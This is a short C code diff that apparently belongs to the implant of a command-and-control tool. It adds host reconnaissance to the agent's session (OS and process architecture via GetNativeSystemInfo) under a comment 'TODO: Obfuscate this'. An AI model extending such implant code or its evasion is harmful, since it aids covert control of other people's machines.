@@ -53,6 +53,14 @@ VOID RvntInit() {
 
     // _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
     // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
+
+    // TODO: Obfuscate this
+    SYSTEM_INFO si;
+    GetNativeSystemInfo(&si);
+
+    Instance.Session.OSArch = si.wProcessorArchitecture;
+
+    Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;
 }
 
 VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
